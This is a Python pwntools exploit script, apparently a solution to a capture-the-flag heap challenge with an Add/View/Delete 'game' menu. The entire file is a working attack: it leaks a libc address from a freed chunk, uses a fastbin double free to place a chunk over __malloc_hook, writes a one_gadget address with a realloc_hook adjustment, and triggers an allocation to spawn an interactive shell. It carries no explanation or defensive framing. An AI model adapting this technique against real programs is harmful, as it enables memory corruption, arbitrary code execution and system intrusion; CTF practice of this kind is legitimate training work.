from parse_args_and_some_func import *

def Add(sh:tube, size:int, name, msg=p64(0) + p64(0x71)):
    sh.sendlineafter("Your choice : ", '1')
    sh.sendlineafter("size of the game's name: \n", str(size))
    sh.sendafter("game's name:\n", name)
    sh.sendlineafter("game's message:\n", msg)
    sh.recvuntil("Added!\n")


def View(sh:tube):
    sh.sendlineafter("Your choice : ", '2')
    return sh.recvuntil("1. Add\n")

def Delete(sh:tube, idx:int):
    sh.sendlineafter("Your choice : ", '3')
    sh.sendlineafter("game's index:\n", str(idx))
    sh.recvuntil("Deleted!\n")

def attack(sh:tube, malloc_hook_offset=0x3c4b10, gadget=0x4527a, realloc_hook_offset=0x84710):
    
    Add(sh, 0x80, 'aaaa') # 0
    Add(sh, 0x20, 'aaaa') # 1
    Delete(sh, 0)
    Delete(sh, 1)
    Add(sh, 0x80, 'aaaa') # 2
    Delete(sh, 0)
    msg = View(sh)
    leak_libc_addr = u64(msg[0x10: 0x16] + b'\x00\x00')
    LOG_ADDR('leak_libc_addr', leak_libc_addr)
    libc_base_addr = leak_libc_addr - 0x3c4b20 - 88
    LOG_ADDR('leak_libc_addr', leak_libc_addr)

    Add(sh, 0x60, 'aaaa') # 3
    Add(sh, 0x60, 'aaaa') # 4
    Delete(sh, 3)
    Delete(sh, 4)
    Delete(sh, 3)

    target_addr = libc_base_addr + malloc_hook_offset - 0x23
    Add(sh, 0x60, p64(target_addr) * 2)
    Add(sh, 0x60, p64(target_addr) * 2)
    Add(sh, 0x60, p64(target_addr) * 2)
    
    Add(sh, 0x60, 0xb * b'a' + p64(libc_base_addr + gadget) + p64(libc_base_addr + realloc_hook_offset + 0xd))
    sh.sendlineafter("Your choice : ", '1')
    sh.interactive()
    

if __name__ == '__main__':
    io = all_parsed_args['io']
    context.update(arch='amd64', os='linux', endian='little')
    r_realloc = 0x846c0
    r_gadget = 0x4526a
    attack(sh=io, realloc_hook_offset=r_realloc, gadget=r_gadget)
    